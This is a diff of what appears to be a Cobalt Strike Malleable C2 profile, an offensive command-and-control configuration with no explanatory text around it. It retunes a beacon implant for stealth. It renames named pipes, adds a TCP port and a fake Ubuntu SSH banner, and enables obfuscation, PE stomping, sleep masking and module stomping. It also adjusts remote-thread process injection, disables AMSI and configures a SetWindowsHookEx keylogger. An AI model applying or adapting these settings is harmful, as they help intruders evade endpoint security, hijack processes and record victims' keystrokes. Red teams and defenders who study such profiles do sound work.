@@ -1,7 +1,17 @@
 ###SMB options###
-set pipename "defnotacsbeacon##";
-set pipename_stager "defnotacsbeacon2##";
+set pipename "notacsbeacon##";
+set pipename_stager "notacsbeaconstg##";
 set smb_frame_header "";
+
+
+###TCP options###
+set tcp_port "8001";
+set tcp_frame_header "";
+
+
+###SSH options###
+set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
 
 ###Steal Token
 set steal_token_access_mask "11";
@@ -14,20 +24,22 @@ stage {
     #set image_size_x86 "6586368";
     #set image_size_x64 "6586368";
     set name	        "srv.dll";
-    set magic_mz_x64    "OOPS";
-    set magic_mz_x86    "OOPS";
+
+
     set userwx 	        "false";
     set cleanup	        "true";
     set stomppe	        "true";
     set obfuscate	"true";
-    set rich_header    "\x71\xd5\xdf\x19\x38\x77\xab\x8d\x2b\x41\x5e\xcb\x98\x22\x05\x90";
-    
     set sleep_mask "true";
+    set rich_header    "\x71\xd5\xdf\x19\x38\x77\xab\x8d\x2b\x41\x5e\xcb\x98\x22\x05\x90";
     
     set smartinject "true";
     
     #set allocator "HeapAlloc";
     set magic_pe "EA";
+    set magic_mz_x64    "MZRE";
+    set magic_mz_x86    "MZAR";
+
 
     set module_x86 "wwanmm.dll";
     set module_x64 "wwanmm.dll";
@@ -101,7 +113,7 @@ process-inject {
         NtQueueApcThread-s;
         #NtQueueApcThread;
         CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
-        CreateRemoteThread;
+        #CreateRemoteThread;
         RtlCreateUserThread;
     }
 }
@@ -115,6 +127,5 @@ post-ex {
     set smartinject "true";
     set amsi_disable "true";
     set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
-    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
     set keylogger "SetWindowsHookEx";
 }
